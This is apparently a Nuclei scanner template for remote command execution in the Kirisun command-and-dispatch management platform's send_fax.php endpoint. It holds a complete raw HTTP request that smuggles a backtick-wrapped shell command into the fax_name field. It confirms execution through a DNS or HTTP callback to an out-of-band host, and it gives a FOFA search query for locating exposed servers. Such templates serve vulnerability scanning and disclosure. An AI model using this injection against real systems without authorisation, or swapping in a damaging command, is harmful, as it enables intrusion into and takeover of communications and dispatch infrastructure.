id: kirisun-send_fax-rce

info:
  name: 福建科立讯通信指挥调度管理平台 send_fax.php - rce
  author: leadlife
  severity: critical
  description:
  reference:
    - 
  metadata:
    verified: true
    fofa-query: body="app/structure/departments.php" ||app="指挥调度管理平台"
  tags: kirisun,rce,oob

http:
  - raw:
      - |
        POST /api/client/fax/send_fax.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Content-Length: 61
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1

        fax_name=`ping {{interactsh-url}}`.pdf

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or